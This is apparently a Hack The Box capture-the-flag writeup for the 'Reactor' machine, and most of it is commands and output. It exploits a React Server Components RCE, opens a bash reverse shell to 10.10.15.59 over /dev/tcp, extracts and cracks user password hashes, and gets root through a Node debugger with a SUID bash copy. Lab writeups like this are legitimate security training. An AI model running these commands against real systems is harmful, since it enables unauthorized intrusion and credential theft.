# Reactor — Hack The Box Writeup

## Overview

Reactor is a Linux machine exposing a Next.js application on port `3000` and SSH on port `22`. Initial access is achieved through a critical React Server Components vulnerability (`CVE-2025-55182` / `GHSA-9qr9-h5gf-34mp`) affecting the vulnerable Next.js App Router implementation.

After obtaining remote code execution as the `node` user, application data and SQLite user hashes are extracted, leading to credential recovery for the `engineer` user. Privilege escalation to root is achieved through an exposed root-owned Node.js inspector/debug interface listening locally on port `9229`.

---

# Enumeration

## Nmap

```bash
sudo nmap -Pn -sC -sV -p- reactor.htb -oA scans/tcp-full
```

### Results

```text
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
3000/tcp open  http    Next.js application
```

The web service exposes several interesting HTTP headers:

```http
X-Powered-By: Next.js
Vary: RSC, Next-Router-State-Tree
Content-Type: text/x-component
```

JavaScript analysis reveals:

```javascript
window.next={version:"15.0.3",appDir:!0}
```

This confirms:

```text
Next.js 15.0.3
App Router enabled
React Server Components
React 19.0.0-rc
```

---

# Vulnerability Identification

The Next.js version matches the affected range for:

```text
GHSA-9qr9-h5gf-34mp
CVE-2025-55182
React2Shell / React Server Components RCE
```

Relevant indicators:

```text
Next.js 15.0.3
React 19 RC
App Router enabled
RSC endpoint responding
```

The following request confirms RSC functionality:

```bash
curl -i http://reactor.htb:3000/ -H 'RSC: 1'
```

Response:

```http
Content-Type: text/x-component
```

---

# Initial Access — React2Shell RCE

A public PoC from the following repository is used to validate command execution:

```text
https://github.com/msanft/CVE-2025-55182
```

## Proof of Code Execution

```bash
python3 poc.py http://reactor.htb:3000 'uname -a'
```

Response:

```text
Linux reactor 6.8.0-117-generic ...
```

This confirms remote command execution as the Node.js application user.

---

# Reverse Shell

## Listener

```bash
nc -lvnp 4444
```

## Payload

```bash
python3 poc.py http://reactor.htb:3000 \
'bash -c "bash -i >& /dev/tcp/10.10.15.59/4444 0>&1"'
```

## Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 120
```

On Kali:

```bash
stty raw -echo; fg
```

---

# Post-Exploitation Enumeration

Inside the application directory:

```bash
cd /opt/reactor-app
ls -la
```

Important files:

```text
.env
reactor.db
package.json
package-lock.json
```

## Environment File

```bash
cat .env
```

Contents:

```text
DB_PATH=/opt/reactor-app/reactor.db
SENSOR_API_KEY=rw_sk_...
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
```

---

# SQLite Database Analysis

## Database Tables

```bash
sqlite3 reactor.db '.tables'
```

Output:

```text
sensor_logs
users
```

## User Extraction

```bash
sqlite3 reactor.db 'select * from users;'
```

Output:

```text
1|admin|a203b22191d744a4e70ada5c101b17b8
2|engineer|39d97110eafe2a9a68639812cd271e8e
```

The hashes appear to be MD5.

---

# Password Cracking

## Hashcat

```bash
hashcat -m 0 -a 0 reactor-users-hashes.txt \
/usr/share/wordlists/rockyou.txt --username
```

Recovered credentials:

```text
engineer:reactor1
```

---

# SSH Access

```bash
ssh engineer@reactor.htb
```

Password:

```text
reactor1
```

---

# Privilege Escalation

## Local Service Enumeration

```bash
ss -lntup
```

Interesting finding:

```text
127.0.0.1:9229
```

This corresponds to a root-owned Node.js process:

```text
/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

The Node.js inspector/debugger is exposed locally.

---

# Root via Node Inspector

## Connect to Debugger

```bash
node inspect 127.0.0.1:9229
```

## Verify Root Execution

```text
exec("process.mainModule.require('child_process').execSync('id').toString()")
```

Output:

```text
uid=0(root) gid=0(root)
```

This confirms arbitrary command execution as root inside the Node process.

---

# Create SUID Bash

Inside the debugger:

```text
exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; ls -la /tmp/rootbash').toString()")
```

Result:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Exit debugger:

```text
.exit
```

---

# Root Shell

```bash
/tmp/rootbash -p
```

Verify privileges:

```bash
id
```

Output:

```text
uid=1000(engineer) gid=1000(engineer) euid=0(root)
```

Read root flag:

```bash
cat /root/root.txt
```

---

# Attack Chain Summary

```text
Next.js 15.0.3 App Router
→ CVE-2025-55182 React2Shell RCE
→ shell as node
→ SQLite hash extraction
→ crack engineer password
→ SSH as engineer
→ discover root Node inspector
→ debugger-based root code execution
→ SUID bash
→ root shell
```
